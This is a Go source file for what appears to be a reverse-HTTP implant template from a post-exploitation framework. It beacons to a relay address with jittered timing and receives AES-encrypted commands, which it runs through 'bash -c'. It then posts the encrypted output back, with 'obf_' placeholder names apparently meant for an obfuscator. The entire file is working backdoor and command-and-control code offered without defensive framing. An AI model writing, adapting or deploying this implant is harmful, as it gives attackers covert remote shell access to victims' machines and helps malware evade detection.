package main

import(
	"io"
	"io/ioutil"
	"strings"
	"strconv"
	obf_import_rand "math/rand"
	"time"
	"log"
	"errors"
	"crypto/aes"
	"crypto/rand"
	"crypto/cipher"
	"encoding/base64"
	"os/exec"
	"net/http"
)

const(
	obf_const_session_id = "QMXwaHcmfvOMYbLw"
	obf_const_post_tag = "P"
	obf_const_get_tag = "G"
)

var(
	obf_var_encryption_key = []byte("MZpirFa4XEQsTNmaBBaFAmXuUCe2Qan0")
	obf_var_relay_address = "http://0.0.0.0:81/relay.php"
	obf_var_useragent = "Sewers Interpreter (Linux) Reverse HTTP Test Session"
)

func obf_func_encrypt(obf_var_payload []byte) ([]byte, error) {
  obf_var_block, err := aes.NewCipher(obf_var_encryption_key)
  if err != nil {
    return nil, err
  }
  obf_var_b := base64.StdEncoding.EncodeToString(obf_var_payload)
  obf_var_ciphertext := make( []byte, aes.BlockSize+len(obf_var_b) )
  obf_var_iv := obf_var_ciphertext[:aes.BlockSize]
  if _, err := io.ReadFull(rand.Reader, obf_var_iv); err != nil {
    return nil, err
  }
  obf_var_cfb := cipher.NewCFBEncrypter(obf_var_block, obf_var_iv)
  obf_var_cfb.XORKeyStream( obf_var_ciphertext[aes.BlockSize:], []byte(obf_var_b) )
	obf_var_enc_ciphertext := []byte( base64.StdEncoding.EncodeToString(obf_var_ciphertext) )
  return obf_var_enc_ciphertext, nil
}

func obf_func_decrypt(obf_var_payload []byte) ([]byte, error) {
  obf_var_block, err := aes.NewCipher(obf_var_encryption_key)
  if err != nil {
    return nil, err
  }
  obf_var_payload, err = base64.StdEncoding.DecodeString( string(obf_var_payload) )
  if err != nil {
    return nil, err
  }
  if len(obf_var_payload) < aes.BlockSize {
    return nil, errors.New("ciphertext too short")
  }
  obf_var_iv := obf_var_payload[:aes.BlockSize]
  obf_var_payload = obf_var_payload[aes.BlockSize:]
  obf_var_cfb := cipher.NewCFBDecrypter(obf_var_block, obf_var_iv)
  obf_var_cfb.XORKeyStream(obf_var_payload, obf_var_payload)
  obf_var_data, err := base64.StdEncoding.DecodeString( string(obf_var_payload) )
  if err != nil {
    return nil, err
  }
  return obf_var_data, nil
}

func obf_func_interpret(obf_var_interpreter_command string) string {
	obf_var_stdout, err := exec.Command("bash", "-c", obf_var_interpreter_command).Output()
	if err != nil {
		return err.Error()
	} else {
		return string(obf_var_stdout)
	}
}

func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_request_body string) string {
	var obf_var_return string

	if obf_var_request_type == obf_const_post_tag {
		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
		obf_var_packet := strings.Join(obf_var_a, "\n")
		obf_var_packet_buffer := strings.NewReader(obf_var_packet)
		obf_var_req, err := http.NewRequest( "POST", obf_var_relay_address, obf_var_packet_buffer )
		if err != nil {
			log.Print(err)
		}
		obf_var_client := &http.Client{}
		obf_var_res, err := obf_var_client.Do(obf_var_req)
		if err != nil {
			log.Print(err)
			return ""
		}
		defer obf_var_res.Body.Close()
		obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
		obf_var_return = string(obf_var_body)
	} else if obf_var_request_type == obf_const_get_tag {
		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
		obf_var_packet := strings.Join(obf_var_a, "\n")
		obf_var_req, err := http.NewRequest( "POST", obf_var_relay_address, strings.NewReader(obf_var_packet) )
		if err != nil {
			log.Print(err)
		}
		obf_var_client := &http.Client{}
		obf_var_res, err := obf_var_client.Do(obf_var_req)
		if err != nil {
			log.Print(err)
			return ""
		}
		defer obf_var_res.Body.Close()
		obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
		obf_var_return = string(obf_var_body)
	}
	return obf_var_return
}

func main() {
	obf_import_rand.Seed(time.Now().UnixNano())
	obf_var_rate := 1 + obf_import_rand.Intn(2-1)
	for {
		obf_var_res := obf_func_send_request(obf_const_get_tag, obf_const_session_id, "nil")
		if obf_var_res != "" {
			obf_var_response := []byte("")
			obf_var_packet_list := strings.Split(obf_var_res, ",")
			for i := 0; i < len(obf_var_packet_list); i++ {
				obf_var_res = obf_func_send_request(obf_const_get_tag, obf_const_session_id, obf_var_packet_list[i])
				if obf_var_res != "" {
					obf_var_enc_res := []byte(obf_var_res)
					obf_var_dec_res, err := obf_func_decrypt(obf_var_enc_res)
					if err != nil {
						log.Print(err)
					}
					obf_var_payload := string(obf_var_dec_res)
					if strings.Split(obf_var_payload, " ")[0] == "obf_tag_fetch_rate" {
						obf_var_a := strings.Split(obf_var_payload, " ")[1]
						obf_var_b := strings.Split(obf_var_payload, " ")[2]
						obf_var_a_int, err := strconv.Atoi(obf_var_a)
						if err != nil {
							log.Print(err)
						}
						obf_var_b_int, err := strconv.Atoi(obf_var_b)
						if err != nil {
							log.Print(err)
						}
						obf_var_rate = obf_var_a_int + obf_import_rand.Intn(obf_var_b_int-obf_var_a_int)
						obf_var_response = []byte("\x00")
					} else {
						obf_var_stdout := obf_func_interpret(obf_var_payload)
						obf_var_response = []byte(obf_var_stdout)
					}
				}
				obf_var_enc_response, err := obf_func_encrypt(obf_var_response)
				if err != nil {
					log.Print(err)
				}
				obf_func_send_request( obf_const_post_tag, obf_const_session_id, string(obf_var_enc_response) )
				time.Sleep( 2 * time.Second )
			}
		}
		time.Sleep( time.Duration(obf_var_rate) * time.Second )
	}
}
